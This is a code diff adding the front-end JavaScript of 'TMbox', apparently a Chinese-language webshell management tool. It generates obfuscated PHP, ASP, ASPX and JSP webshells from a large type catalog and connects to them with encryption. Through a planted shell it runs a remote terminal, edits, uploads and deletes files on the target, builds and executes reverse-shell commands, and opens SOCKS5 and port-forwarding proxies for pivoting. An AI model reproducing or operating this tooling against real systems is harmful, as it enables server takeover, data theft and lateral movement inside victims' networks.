+            document.getElementById('scanNuclei').checked = false;
+            document.getElementById('scanCommonPaths').checked = false;
+            document.getElementById('scanBackup').checked = false;
+            document.getElementById('scanFuzz').checked = true;
+            await startAutoScan();
+        }
+
+        // 测试连接 (快捷按钮)
+        async function testConnection() {
+            const url = document.getElementById('quickConnectUrl').value;
+            if (url) {
+                await testShellUrl(url);
+            } else {
+                alert('请先扫描发现或输入 URL');
+            }
+        }
+
+        // Shell 列表刷新
+        function refreshShellList() {
+            const shells = WebshellCore.getShells();
+            const listEl = document.getElementById('shellList');
+            const countEl = document.getElementById('shellCount');
+            countEl.textContent = `${shells.length} 个`;
+
+            if (shells.length === 0) {
+                listEl.innerHTML = '<div class="text-center text-slate-600 text-xs py-4">暂无 Shell</div>';
+                return;
+            }
+
+            listEl.innerHTML = shells.map(shell => {
+                const isActive = WebshellCore.getActiveShell()?.id === shell.id;
+                const statusColor = shell.status === 'active' ? 'bg-green-500' :
+                                   shell.status === 'error' ? 'bg-red-500' :
+                                   shell.status === 'connecting' ? 'bg-yellow-500 animate-pulse' : 'bg-yellow-500';
+                const cryptoBadge = shell.enableEncryption ? '<span class="crypto-badge bg-green-900/50 text-green-400 ml-1">🔐</span>' : '';
+                return `
+                    <div class="shell-card p-2 bg-slate-900 rounded border border-slate-700 cursor-pointer transition ${isActive ? 'border-pink-500' : ''}"
+                         onclick="selectShell('${shell.id}')">
+                        <div class="flex items-center gap-2">
+                            <div class="w-2 h-2 rounded-full ${statusColor}"></div>
+                            <div class="flex-1 truncate text-xs font-medium">${shell.name}</div>
+                            ${cryptoBadge}
+                            <button onclick="event.stopPropagation(); deleteShell('${shell.id}')" class="text-slate-500 hover:text-red-400 text-xs">&times;</button>
+                        </div>
+                        <div class="text-[10px] text-slate-500 truncate mt-1">${shell.url}</div>
+                        <div class="text-[10px] text-slate-600 mt-0.5">${shell.type}</div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // 选择 Shell
+        async function selectShell(id) {
+            const shell = await WebshellCore.setActiveShell(id);
+            if (shell) {
+                document.getElementById('shellStatus').textContent = shell.name;
+                document.getElementById('shellStatus').className = 'text-[10px] px-2 py-0.5 rounded bg-green-900/50 text-green-400';
+                updateCryptoStatus(shell.enableEncryption, shell);
+                refreshShellList();
+
+                // 测试连接并获取信息
+                appendTerminalOutput(`[+] 正在连接 ${shell.url}...`, 'info');
+                if (shell.enableEncryption) {
+                    appendTerminalOutput(`[*] 加密模式: AES-256-CBC + RSA-2048`, 'info');
+                    appendTerminalOutput(`[*] Session ID: ${shell.crypto?.sessionId?.substring(0, 16)}...`, 'info');
+                }
+
+                const result = await WebshellCore.testShell(shell);
+                if (result.success) {
+                    appendTerminalOutput(`[+] 连接成功!`, 'success');
+                    if (shell.info) {
+                        appendTerminalOutput(`[*] 系统: ${shell.info.kernel || 'Unknown'}`, 'info');
+                        appendTerminalOutput(`[*] 用户: ${shell.info.user || 'Unknown'}`, 'info');
+                        appendTerminalOutput(`[*] 路径: ${shell.info.cwd || 'Unknown'}`, 'info');
+                        WebshellTerminal.setConfig({
+                            cwd: shell.info.cwd || '/',
+                            username: shell.info.user || 'www-data',
+                            hostname: shell.info.hostname || 'target'
+                        });
+                        updatePrompt();
+                    }
+                    // 更新序列号显示
+                    document.getElementById('sequenceNum').textContent = shell.crypto?.sequence || 0;
+                } else {
+                    appendTerminalOutput(`[-] 连接失败: ${result.message}`, 'error');
+                }
+            }
+        }
+
+        // 删除 Shell
+        function deleteShell(id) {
+            if (confirm('确定删除这个 Shell?')) {
+                WebshellCore.deleteShell(id);
+                refreshShellList();
+                if (WebshellCore.getActiveShell()?.id === id) {
+                    document.getElementById('shellStatus').textContent = '未连接';
+                    document.getElementById('shellStatus').className = 'text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-500';
+                    updateCryptoStatus(false);
+                }
+            }
+        }
+
+        // 显示/隐藏模态框
+        function showAddShellModal() { document.getElementById('addShellModal').classList.remove('hidden'); }
+        function hideAddShellModal() { document.getElementById('addShellModal').classList.add('hidden'); }
+        function showGenerateShellModal() { document.getElementById('generateShellModal').classList.remove('hidden'); updateGeneratedShell(); }
+        function hideGenerateShellModal() { document.getElementById('generateShellModal').classList.add('hidden'); }
+        function showImportModal() { document.getElementById('importModal').classList.remove('hidden'); }
+        function hideImportModal() { document.getElementById('importModal').classList.add('hidden'); }
+
+        // 添加新 Shell
+        async function addNewShell() {
+            const name = document.getElementById('shellName').value || 'New Shell';
+            const url = document.getElementById('shellUrl').value;
+            const password = document.getElementById('shellPassword').value || 'cmd';
+            const type = document.getElementById('shellType').value;
+            const enableEncryption = document.getElementById('shellEncryption').checked;
+            const enableSign = document.getElementById('shellSign').checked;
+            const enablePadding = document.getElementById('shellPadding').checked;
+
+            if (!url) {
+                alert('请输入 URL');
+                return;
+            }
+
+            const shell = await WebshellCore.addShell({
+                name, url, password, type,
+                enableEncryption,
+                enableSign,
+                enablePadding
+            });
+            hideAddShellModal();
+            refreshShellList();
+            selectShell(shell.id);
+        }
+
+        // 更新生成的 Shell 代码
+        function updateGeneratedShell() {
+            const type = document.getElementById('genShellType').value;
+            const password = document.getElementById('genShellPassword').value || 'cmd';
+            const obfuscateLevel = document.getElementById('genObfuscateLevel').value;
+
+            let code;
+            if (obfuscateLevel === 'none') {
+                code = WebshellProtocol.generateShell(type, password);
+            } else {
+                code = WebshellProtocol.generateShell(type, password, { obfuscate: true, obfuscateMethod: obfuscateLevel });
+            }
+
+            // 如果生成器不存在，回退到基础生成
+            if (!code) {
+                code = WebshellProtocol.generateShellCode(type, password);
+            }
+
+            document.getElementById('generatedShellCode').value = code;
+
+            // 更新代码大小和行数
+            const bytes = new Blob([code]).size;
+            const lines = code.split('\n').length;
+            document.getElementById('codeSize').textContent = bytes + ' bytes';
+            document.getElementById('codeLines').textContent = lines + ' 行';
+
+            // 更新说明
+            updateShellDescription(type);
+        }
+
+        // 更新 Shell 类型说明
+        function updateShellDescription(type) {
+            const descriptions = {
+                // PHP 8.x 专用
+                'php8_eval': '🟢 PHP 8.x 推荐 - 直接使用 eval()，最可靠的方式。PHP 8.0+ 完美兼容。',
+                'php8_system': '🟢 PHP 8.x - 使用 system() 执行命令并直接输出结果。',
+                'php8_passthru': '🟢 PHP 8.x - 使用 passthru() 执行命令，适合二进制输出。',
+                'php8_shell_exec': '🟢 PHP 8.x - 使用 shell_exec() 执行命令，返回完整输出。',
+                'php8_proc_open': '🟢 PHP 8.x - 使用 proc_open() 最强大的方式，支持双向管道通信。',
+                'php8_popen': '🟢 PHP 8.x - 使用 popen() 打开进程管道。',
+                'php8_exec': '🟢 PHP 8.x - 使用 exec() 执行命令，输出到数组。',
+                'php8_dynamic': '🟢 PHP 8.x - 动态函数调用，通过 GET 参数选择执行函数。',
+                'php8_backtick': '🟢 PHP 8.x - 使用反引号执行命令（需要 shell_exec 未被禁用）。',
+                'php8_pcntl': '🟢 PHP 8.x - 使用 pcntl_exec() 执行命令（需要 pcntl 扩展）。',
+                // PHP 7.x 专用
+                'php7_create_function': '🟡 PHP 7.x - 使用 create_function() 创建匿名函数（PHP 7.2+ 已弃用）。',
+                'php7_assert': '🟡 PHP 7.x - 使用 assert() 执行代码（PHP 7.2+ 会产生弃用警告）。',
+                'php7_preg_replace': '🟡 PHP 5.x-7.0 - 使用 preg_replace /e 修饰符（PHP 7+ 已移除）。',
+                // PHP 通用
+                'php_base64': '🔵 PHP 通用 - Base64 编码命令，需要客户端配合编码。',
+                'php_rot13': '🔵 PHP 通用 - ROT13 编码命令，需要客户端配合编码。',
+                'php_xor': '🔵 PHP 通用 - XOR 加密命令，使用密码作为密钥。',
+                'php_concat': '🔵 PHP 通用 - 字符串拼接技术，将函数名拆分拼接。',
+                'php_variable_func': '🔵 PHP 通用 - 利用 PHP 可变函数特性。',
+                'php_callback_array': '🔵 PHP 通用 - array_map 回调函数执行。',
+                'php_callback_filter': '🔵 PHP 通用 - array_filter 回调执行。',
+                'php_callback_walk': '🔵 PHP 通用 - array_walk 回调执行。',
+                'php_callback_usort': '🔵 PHP 通用 - usort 回调执行。',
+                'php_callback_reduce': '🔵 PHP 通用 - array_reduce 回调执行。',
+                'php_reflection': '🔵 PHP 通用 - 利用 PHP 反射 API。',
+                'php_class_construct': '🔵 PHP 通用 - __construct 魔术方法。',
+                'php_class_invoke': '🔵 PHP 通用 - __invoke 魔术方法。',
+                'php_class_call': '🔵 PHP 通用 - __call 魔术方法。',
+                'php_class_get': '🔵 PHP 通用 - __get 魔术方法。',
+                'php_strrev': '🔵 PHP 通用 - 字符串反转函数名。',
+                'php_multilayer_b64': '🔵 PHP 通用 - 多层 Base64 编码。',
+                'php_gzip': '🔵 PHP 通用 - Gzip 压缩编码。',
+                'php_comment_split': '🔵 PHP 通用 - 利用注释分割字符串。',
+                'php_unicode': '🔵 PHP 通用 - Unicode 转义编码。',
+                'php_hex': '🔵 PHP 通用 - 十六进制编码函数名。',
+                'php_chr_shift': '🔵 PHP 通用 - chr() 拼接字符。',
+                'php_preg_callback': '🔵 PHP 通用 - preg_replace_callback 正则回调。',
+                'php_variable_overwrite': '🔵 PHP 通用 - parse_str 变量覆盖。',
+                'php_no_alpha_num': '🔵 PHP 通用 - 无字母数字 Webshell。',
+                'php_cookie': '🔵 PHP 通用 - Cookie 传参。',
+                'php_header': '🔵 PHP 通用 - HTTP Header 传参。',
+                'php_request': '🔵 PHP 通用 - $_REQUEST 混合传参。',
+                'php_include': '🔵 PHP 通用 - 文件包含型。',
+                'php_dynamic_func': '🔵 PHP 通用 - 随机选择执行函数。',
+                'php_image_header': '🔵 PHP 通用 - 图片马（GIF89a 头）。',
+                'php_session': '🔵 PHP 通用 - Session 存储型。',
+                'php_log_include': '🔵 PHP 通用 - 日志包含型。',
+                'php_htaccess': '🔵 特殊 - .htaccess 配置文件。',
+                // ASP
+                'asp_simple': 'ASP 基础一句话，使用 Execute 执行。',
+                'asp_encode': 'ASP 编码执行，使用 ExecuteGlobal。',
+                'asp_chr': 'ASP Chr 编码，ASCII 码拼接。',
+                'asp_include': 'SSI 服务器端包含。',
+                // ASPX
+                'aspx_jscript': 'ASPX JScript 一句话。',
+                'aspx_csharp': 'ASPX C# 命令执行。',
+                'aspx_base64': 'ASPX Base64 编码。',
+                'aspx_reflection': 'ASPX 反射加载。',
+                // JSP
+                'jsp_runtime': 'JSP Runtime 执行。',
+                'jsp_processbuilder': 'JSP ProcessBuilder。',
+                'jsp_scriptengine': 'JSP 脚本引擎。',
+                'jsp_expression': 'JSP EL 表达式。',
+                'jsp_bsh': 'JSP BeanShell。',
+                // 冰蝎
+                'behinder_php_enhanced': '冰蝎 PHP 增强版，使用 OpenSSL AES 加密通信。',
+                'behinder_jsp_enhanced': '冰蝎 JSP 增强版，支持动态加载字节码。',
+                // 其他
+                'py_flask': 'Python Flask Web 框架实现的 Webshell。',
+                'py_django': 'Python Django 框架 View 实现。',
+                'nodejs_express': 'Node.js Express 框架实现。',
+                'go_http': 'Go 语言 HTTP 服务实现。'
+            };
+
+            const descEl = document.getElementById('shellDescription');
+            descEl.innerHTML = '<span class="text-cyan-400">💡 说明:</span> ' + (descriptions[type] || '选择类型查看详细说明');
+        }
+
+        // 过滤 Shell 分类
+        function filterShellCategory(category) {
+            // 更新按钮状态
+            document.querySelectorAll('.shell-cat-btn').forEach(btn => {
+                if (btn.dataset.cat === category) {
+                    btn.classList.remove('bg-slate-700', 'text-slate-300');
+                    btn.classList.add('bg-purple-600', 'text-white');
+                } else {
+                    btn.classList.remove('bg-purple-600', 'text-white');
+                    btn.classList.add('bg-slate-700', 'text-slate-300');
+                }
+            });
+
+            // 过滤选项
+            const select = document.getElementById('genShellType');
+            const optgroups = select.querySelectorAll('optgroup');
+
+            optgroups.forEach(optgroup => {
+                if (category === 'all') {
+                    optgroup.style.display = '';
+                } else {
+                    const label = optgroup.label;
+                    let show = false;
+
+                    if (category === 'PHP 8.x' && label.includes('PHP 8.x')) show = true;
+                    else if (category === 'PHP 7.x' && label.includes('PHP 7.x')) show = true;
+                    else if (category === 'PHP 通用' && (label.includes('通用') || label.includes('回调') || label.includes('类与') || label.includes('传参') || label.includes('特殊'))) show = true;
+                    else if (category === 'ASP' && label.includes('ASP')) show = true;
+                    else if (category === 'ASPX' && label.includes('ASPX')) show = true;
+                    else if (category === 'JSP' && label.includes('JSP')) show = true;
+                    else if (category === '冰蝎' && label.includes('冰蝎')) show = true;
+                    else if (category === '其他' && (label.includes('Python') || label.includes('Node') || label.includes('Go'))) show = true;
+
+                    optgroup.style.display = show ? '' : 'none';
+                }
+            });
+        }
+
+        // 快速选择推荐类型
+        function quickSelectShell(phpVersion) {
+            const select = document.getElementById('genShellType');
+            const password = document.getElementById('genShellPassword');
+
+            switch(phpVersion) {
+                case 'php8':
+                    select.value = 'php8_eval';
+                    if (!password.value) password.value = 'cmd';
+                    break;
+                case 'php7':
+                    select.value = 'php7_assert';
+                    if (!password.value) password.value = 'cmd';
+                    break;
+                case 'php5':
+                    select.value = 'php_base64';
+                    if (!password.value) password.value = 'cmd';
+                    break;
+                case 'behinder':
+                    select.value = 'behinder_php_enhanced';
+                    if (!password.value) password.value = 'pass';
+                    break;
+                case 'bypass':
+                    select.value = 'php_no_alpha_num';
+                    if (!password.value) password.value = 'cmd';
+                    break;
+            }
+            updateGeneratedShell();
+        }
+
+        // 切换使用指南显示
+        function toggleUsageGuide() {
+            const guide = document.getElementById('usageGuide');
+            guide.classList.toggle('hidden');
+        }
+
+        // 一键生成并添加到列表 (输入URL后快速使用)
+        async function generateAndAdd() {
+            const type = document.getElementById('genShellType').value;
+            const password = document.getElementById('genShellPassword').value || 'cmd';
+
+            // 弹出输入URL对话框
+            const url = prompt('请输入 Webshell 的完整 URL:\n例如: http://target.com/uploads/shell.php');
+            if (!url) return;
+
+            // 添加到列表
+            const shell = await WebshellCore.addShell({
+                name: url.split('/').pop() || 'New Shell',
+                url: url,
+                password: password,
+                type: type,
+                enableEncryption: true
+            });
+
+            hideGenerateShellModal();
+            refreshShellList();
+            selectShell(shell.id);
+        }
+
+        // 随机生成
+        function generateRandomShell() {
+            const select = document.getElementById('genShellType');
+            const options = select.querySelectorAll('option');
+            const randomIndex = Math.floor(Math.random() * options.length);
+            select.selectedIndex = randomIndex;
+
+            // 随机密码
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let password = '';
+            for (let i = 0; i < 6; i++) {
+                password += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            document.getElementById('genShellPassword').value = password;
+
+            // 随机混淆级别
+            const levels = ['none', 'basic', 'variable', 'comment'];
+            document.getElementById('genObfuscateLevel').value = levels[Math.floor(Math.random() * levels.length)];
+
+            updateGeneratedShell();
+        }
+
+        // 显示批量下载模态框
+        function downloadAsZip() {
+            const modal = document.getElementById('batchDownloadModal');
+            const list = document.getElementById('batchShellList');
+
+            const types = WebshellProtocol.getShellTypes();
+            list.innerHTML = types.map(t => `
+                <label class="flex items-center gap-2 p-1.5 hover:bg-slate-700 rounded cursor-pointer">
+                    <input type="checkbox" class="shell-checkbox rounded" value="${t.id}" onchange="updateSelectedCount()">
+                    <span class="text-[10px] text-slate-400 w-16">${t.category}</span>
+                    <span class="text-xs text-slate-200">${t.name}</span>
+                </label>
+            `).join('');
+
+            modal.classList.remove('hidden');
+            updateSelectedCount();
+        }
+
+        function hideBatchDownloadModal() {
+            document.getElementById('batchDownloadModal').classList.add('hidden');
+        }
+
+        function selectAllShells() {
+            document.querySelectorAll('.shell-checkbox').forEach(cb => cb.checked = true);
+            updateSelectedCount();
+        }
+
+        function deselectAllShells() {
+            document.querySelectorAll('.shell-checkbox').forEach(cb => cb.checked = false);
+            updateSelectedCount();
+        }
+
+        function updateSelectedCount() {
+            const count = document.querySelectorAll('.shell-checkbox:checked').length;
+            document.getElementById('selectedCount').textContent = count;
+        }
+
+        // 执行批量下载
+        async function executeBatchDownload() {
+            const checkboxes = document.querySelectorAll('.shell-checkbox:checked');
+            if (checkboxes.length === 0) {
+                alert('请至少选择一个类型');
+                return;
+            }
+
+            const password = document.getElementById('genShellPassword').value || 'cmd';
+            const obfuscateLevel = document.getElementById('genObfuscateLevel').value;
+
+            // 使用 JSZip 创建压缩包
+            let zipContent = '';
+            const files = [];
+
+            checkboxes.forEach(cb => {
+                const type = cb.value;
+                let code;
+                if (obfuscateLevel === 'none') {
+                    code = WebshellProtocol.generateShell(type, password);
+                } else {
+                    code = WebshellProtocol.generateShell(type, password, { obfuscate: true, obfuscateMethod: obfuscateLevel });
+                }
+                if (!code) {
+                    code = WebshellProtocol.generateShellCode(type, password);
+                }
+
+                const ext = WebshellProtocol.getShellExtension(type);
+                const name = type.replace(/_/g, '-') + '.' + ext;
+                files.push({ name, code });
+            });
+
+            // 简单打包为多个文件下载（无 JSZip 库时）
+            if (files.length <= 5) {
+                // 少量文件直接逐个下载
+                files.forEach((f, i) => {
+                    setTimeout(() => {
+                        downloadFile(f.name, f.code);
+                    }, i * 300);
+                });
+            } else {
+                // 多文件生成一个汇总文本
+                let combined = '# TMbox Webshell Collection\n';
+                combined += '# Generated: ' + new Date().toISOString() + '\n';
+                combined += '# Password: ' + password + '\n\n';
+                combined += '='.repeat(60) + '\n\n';
+
+                files.forEach(f => {
+                    combined += `## File: ${f.name}\n`;
+                    combined += '-'.repeat(40) + '\n';
+                    combined += f.code;
+                    combined += '\n' + '='.repeat(60) + '\n\n';
+                });
+
+                downloadFile('webshells-collection.txt', combined);
+            }
+
+            hideBatchDownloadModal();
+            alert(`已下载 ${files.length} 个文件`);
+        }
+
+        // 下载单个文件
+        function downloadFile(filename, content) {
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // 复制生成的 Shell
+        function copyGeneratedShell() {
+            const code = document.getElementById('generatedShellCode').value;
+            navigator.clipboard.writeText(code);
+            alert('已复制到剪贴板');
+        }
+
+        // 下载生成的 Shell
+        function downloadGeneratedShell() {
+            const code = document.getElementById('generatedShellCode').value;
+            const type = document.getElementById('genShellType').value;
+            const ext = type.includes('jsp') ? 'jsp' : type.includes('aspx') ? 'aspx' : 'php';
+            const blob = new Blob([code], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `shell.${ext}`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        // 终端相关
+        function appendTerminalOutput(text, type = 'normal') {
+            const output = document.getElementById('terminalOutput');
+            const colors = {
+                'normal': 'text-green-400',
+                'info': 'text-cyan-400',
+                'success': 'text-green-400',
+                'error': 'text-red-400',
+                'warning': 'text-yellow-400'
+            };
+            const span = document.createElement('span');
+            span.className = colors[type] || colors['normal'];
+            span.textContent = text + '\n';
+            output.appendChild(span);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function updatePrompt() {
+            const config = WebshellTerminal.getConfig();
+            const prompt = `${config.username}@${config.hostname}:${config.cwd}${config.username === 'root' ? '#' : '$'} `;
+            document.getElementById('terminalPrompt').textContent = prompt;
+        }
+
+        async function executeTerminalCommand() {
+            const input = document.getElementById('terminalInput');
+            const cmd = input.value.trim();
+            if (!cmd) return;
+
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) {
+                appendTerminalOutput('[-] 请先连接一个 Shell', 'error');
+                return;
+            }
+
+            input.value = '';
+            const prompt = document.getElementById('terminalPrompt').textContent;
+            appendTerminalOutput(`${prompt}${cmd}`);
+
+            WebshellTerminal.addToHistory(cmd);
+
+            const result = await WebshellCore.executeCommand(shell, cmd);
+            if (result.success) {
+                appendTerminalOutput(result.output);
+                // 更新 cwd
+                if (cmd.startsWith('cd ')) {
+                    WebshellTerminal.updateCwd(result.output.trim());
+                    updatePrompt();
+                }
+                // 更新序列号
+                document.getElementById('sequenceNum').textContent = shell.crypto?.sequence || 0;
+            } else {
+                appendTerminalOutput(`[-] ${result.output}`, 'error');
+            }
+        }
+
+        // 文件管理
+        async function refreshFileList() {
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) return;
+
+            const path = document.getElementById('currentPath').value;
+            const files = await WebshellCore.fileOps.list(shell, path);
+
+            const tbody = document.getElementById('fileTableBody');
+            if (files.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" class="p-4 text-center text-slate-600">目录为空或读取失败</td></tr>';
+                return;
+            }
+
+            // 排序：目录优先
+            files.sort((a, b) => {
+                if (a.type === 'dir' && b.type !== 'dir') return -1;
+                if (a.type !== 'dir' && b.type === 'dir') return 1;
+                return a.name.localeCompare(b.name);
+            });
+
+            tbody.innerHTML = files.map(f => `
+                <tr class="border-b border-slate-800 hover:bg-slate-800/50">
+                    <td class="p-2">
+                        <span class="mr-2">${f.icon}</span>
+                        <span class="${f.type === 'dir' ? 'text-blue-400 cursor-pointer hover:underline' : ''}"
+                              ${f.type === 'dir' ? `onclick="enterDir('${f.name}')"` : ''}>${f.name}</span>
+                    </td>
+                    <td class="p-2 text-right text-slate-400">${f.type === 'dir' ? '-' : WebshellFileManager.formatFileSize(f.size)}</td>
+                    <td class="p-2 text-right text-slate-500">${WebshellFileManager.formatTimestamp(f.mtime)}</td>
+                    <td class="p-2 text-right text-slate-500">${f.perm}</td>
+                    <td class="p-2 text-center">
+                        ${f.type !== 'dir' ? `<button onclick="downloadFile('${f.name}')" class="text-blue-400 hover:text-blue-300 text-[10px] mr-1">下载</button>
+                        <button onclick="editFile('${f.name}')" class="text-yellow-400 hover:text-yellow-300 text-[10px] mr-1">编辑</button>` : ''}
+                        <button onclick="deleteFile('${f.name}')" class="text-red-400 hover:text-red-300 text-[10px]">删除</button>
+                    </td>
+                </tr>
+            `).join('');
+
+            // 更新序列号
+            document.getElementById('sequenceNum').textContent = shell.crypto?.sequence || 0;
+        }
+
+        function goToParentDir() {
+            const path = document.getElementById('currentPath').value;
+            const parts = path.split('/').filter(p => p);
+            parts.pop();
+            document.getElementById('currentPath').value = '/' + parts.join('/');
+            refreshFileList();
+        }
+
+        function enterDir(name) {
+            const path = document.getElementById('currentPath').value;
+            document.getElementById('currentPath').value = path === '/' ? '/' + name : path + '/' + name;
+            refreshFileList();
+        }
+
+        async function downloadFile(name) {
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) return;
+            const path = document.getElementById('currentPath').value;
+            const fullPath = path === '/' ? '/' + name : path + '/' + name;
+            await WebshellFileManager.downloadFileChunked(fullPath, {
+                execute: async (payload) => {
+                    const result = await WebshellCore.sendRequest(shell, payload);
+                    return result.data;
+                }
+            });
+        }
+
+        function editFile(name) {
+            const path = document.getElementById('currentPath').value;
+            const fullPath = path === '/' ? '/' + name : path + '/' + name;
+            // 简单编辑功能
+            const shell = WebshellCore.getActiveShell();
+            if (shell) {
+                WebshellCore.fileOps.read(shell, fullPath).then(result => {
+                    if (result.success) {
+                        const newContent = prompt('编辑文件内容:', result.data);
+                        if (newContent !== null && newContent !== result.data) {
+                            WebshellCore.fileOps.write(shell, fullPath, newContent).then(() => {
+                                alert('保存成功');
+                                refreshFileList();
+                            });
+                        }
+                    }
+                });
+            }
+        }
+
+        async function deleteFile(name) {
+            if (!confirm(`确定删除 ${name}?`)) return;
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) return;
+            const path = document.getElementById('currentPath').value;
+            const fullPath = path === '/' ? '/' + name : path + '/' + name;
+            await WebshellCore.fileOps.delete(shell, fullPath);
+            refreshFileList();
+        }
+
+        function showUploadModal() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    const shell = WebshellCore.getActiveShell();
+                    if (shell) {
+                        const path = document.getElementById('currentPath').value;
+                        const fullPath = path === '/' ? '/' + file.name : path + '/' + file.name;
+                        appendTerminalOutput(`[*] 上传中: ${file.name} (${WebshellFileManager.formatFileSize(file.size)})`, 'info');
+                        await WebshellCore.fileOps.upload(shell, file, fullPath, (progress) => {
+                            appendTerminalOutput(`[*] 进度: ${progress.percent}%`, 'info');
+                        });
+                        appendTerminalOutput(`[+] 上传完成!`, 'success');
+                        refreshFileList();
+                    }
+                }
+            };
+            input.click();
+        }
+
+        function showMkdirModal() {
+            const name = prompt('目录名称:');
+            if (name) {
+                const shell = WebshellCore.getActiveShell();
+                if (shell) {
+                    const path = document.getElementById('currentPath').value;
+                    const fullPath = path === '/' ? '/' + name : path + '/' + name;
+                    WebshellCore.fileOps.mkdir(shell, fullPath).then(() => refreshFileList());
+                }
+            }
+        }
+
+        // 反弹 Shell
+        function generateReverseShell() {
+            const type = document.getElementById('reverseType').value;
+            const ip = document.getElementById('reverseIp').value || window.location.hostname;
+            const port = document.getElementById('reversePort').value || '4444';
+
+            const cmd = WebshellReverse.generateShellCommand(type, ip, port);
+            document.getElementById('reverseCommand').textContent = cmd;
+
+            // 添加到历史
+            WebshellReverse.addReverseShell({ type, ip, port });
+            updateReverseHistory();
+        }
+
+        function updateReverseHistory() {
+            const history = WebshellReverse.getReverseShells();
+            const el = document.getElementById('reverseHistory');
+
+            if (history.length === 0) {
+                el.innerHTML = '<div class="text-slate-600 text-xs text-center py-4">暂无记录</div>';
+                return;
+            }
+
+            el.innerHTML = history.slice(-10).reverse().map(h => `
+                <div class="bg-slate-800 rounded p-2 text-xs">
+                    <div class="flex justify-between items-center">
+                        <span class="text-slate-400">${h.type}</span>
+                        <span class="text-slate-500">${new Date(h.createdAt).toLocaleString()}</span>
+                    </div>
+                    <code class="text-green-400 block mt-1 break-all">${h.command}</code>
+                </div>
+            `).join('');
+        }
+
+        async function executeReverseShell() {
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) {
+                alert('请先连接一个 Shell');
+                return;
+            }
+            const cmd = document.getElementById('reverseCommand').textContent;
+            if (!cmd || cmd.includes('选择类型')) {
+                alert('请先生成反弹命令');
+                return;
+            }
+            appendTerminalOutput(`[*] 正在执行反弹 Shell...`, 'info');
+            const result = await WebshellCore.executeCommand(shell, cmd);
+            appendTerminalOutput(result.success ? '[+] 命令已发送' : `[-] 执行失败: ${result.output}`, result.success ? 'success' : 'error');
+        }
+
+        function copyReverseCommand() {
+            const cmd = document.getElementById('reverseCommand').textContent;
+            navigator.clipboard.writeText(cmd);
+            alert('已复制');
+        }
+
+        function copyListenerCommand() {
+            const port = document.getElementById('reversePort').value || '4444';
+            const cmd = WebshellReverse.getListenerCommand(port);
+            navigator.clipboard.writeText(cmd);
+            alert(`已复制监听命令: ${cmd}`);
+        }
+
+        // 代理
+        let currentProxyMode = 'forward';
+
+        function setProxyMode(mode) {
+            currentProxyMode = mode;
+
+            // 更新按钮状态
+            document.querySelectorAll('.proxy-mode-btn').forEach(btn => {
+                btn.classList.remove('bg-cyan-600', 'text-white');
+                btn.classList.add('bg-slate-700', 'text-slate-300');
+            });
+            document.getElementById(`proxyMode${mode.charAt(0).toUpperCase() + mode.slice(1)}`).classList.remove('bg-slate-700', 'text-slate-300');
+            document.getElementById(`proxyMode${mode.charAt(0).toUpperCase() + mode.slice(1)}`).classList.add('bg-cyan-600', 'text-white');
+
+            // 切换配置面板
+            document.getElementById('proxyForwardConfig').classList.toggle('hidden', mode === 'single');
+            document.getElementById('proxySingleConfig').classList.toggle('hidden', mode !== 'single');
+        }
+
+        async function startProxyForward() {
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) {
+                alert('请先连接一个 Shell');
+                return;
+            }
+
+            const localPort = parseInt(document.getElementById('proxyLocalPort').value) || 1080;
+            const targetHost = document.getElementById('proxyTargetHost').value;
+            const targetPort = parseInt(document.getElementById('proxyTargetPort').value);
+
+            if (!targetHost || !targetPort) {
+                alert('请输入目标主机和端口');
+                return;
+            }
+
+            addProxyLog(`正在启动代理: ${localPort} -> ${targetHost}:${targetPort}`, 'info');
+
+            let result;
+            if (currentProxyMode === 'forward') {
+                result = await WebshellProxy.startPortForward(shell, localPort, targetHost, targetPort);
+            } else if (currentProxyMode === 'socks5') {
+                result = await WebshellProxy.startSocks5Proxy(shell, localPort);
+            } else if (currentProxyMode === 'http') {
+                result = await WebshellProxy.startHttpProxy(shell, localPort);
+            }
+
+            if (result.success) {
+                addProxyLog(result.message || '代理已启动', 'success');
+                document.getElementById('startProxyBtn').classList.add('hidden');
+                document.getElementById('stopProxyBtn').classList.remove('hidden');
+                document.getElementById('proxyStatus').classList.remove('hidden');
+                updateProxyStatus();
+            } else {
+                addProxyLog(`启动失败: ${result.error}`, 'error');
+            }
+        }
+
+        function stopProxyAction() {
+            WebshellProxy.stopProxy();
+            addProxyLog('代理已停止', 'info');
+            document.getElementById('startProxyBtn').classList.remove('hidden');
+            document.getElementById('stopProxyBtn').classList.add('hidden');
+            document.getElementById('proxyStatus').classList.add('hidden');
+        }
+
+        async function sendSingleProxyRequest() {
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) {
+                alert('请先连接一个 Shell');
+                return;
+            }
+
+            const host = document.getElementById('singleProxyHost').value;
+            const port = parseInt(document.getElementById('singleProxyPort').value) || 80;
+            const data = document.getElementById('singleProxyData').value;
+
+            if (!host) {
+                alert('请输入目标主机');
+                return;
+            }
+
+            addProxyLog(`发送请求到 ${host}:${port}`, 'info');
+
+            const result = await WebshellProxy.sendProxyRequest(shell, host, port, data);
+
+            if (result.success) {
+                addProxyLog(`响应收到 (${result.data.length} bytes)`, 'success');
+                document.getElementById('proxyResponseArea').classList.remove('hidden');
+                document.getElementById('proxyResponse').textContent = result.data;
+            } else {
+                addProxyLog(`请求失败: ${result.error}`, 'error');
+            }
+
+            updateProxyStatus();
+        }
+
